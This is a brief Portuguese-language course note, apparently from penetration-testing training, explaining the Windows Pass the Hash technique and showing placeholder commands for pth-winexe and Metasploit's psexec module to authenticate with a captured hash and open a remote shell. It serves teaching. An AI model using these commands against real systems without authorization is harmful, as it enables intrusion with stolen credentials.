<h1 align="center">Pass the Hash</h1>
<hr>

  Outra tecnica bem interessante que nos temos no Windows eh o <span style='color:var(--mk-color-green)'>Pass The Hash</span> , essa tecnica quando a gente obtem hashes de sistema  e nao conseguimos quebrar eles a gente pode utilizar esses hashes para nos AUTENTICAR no sistema  mesmo sem saber a senha.

Existe um outro programa no Kali chamado <span style='color:var(--mk-color-red)'>pth-winexe</span>  funciona como o mesmo comando da aula passada porem ele permite voce passar o hash ao inves da senha . Exemplo:

```sh
pth-winexe -U rogerio%<HASH> //<IP DO SERVIDOR> cmd.exe
```

Tecnica absolutamente interessantes pois em alguma hora nao conseguiremos quebrar os hashes dos usuarios

Podemos fazer o mesmo no metasploit com o psexec:

```sh
msf5 exploit(windows/smb/psexec) > set SMBPass <HASH>
msf5> exploit
```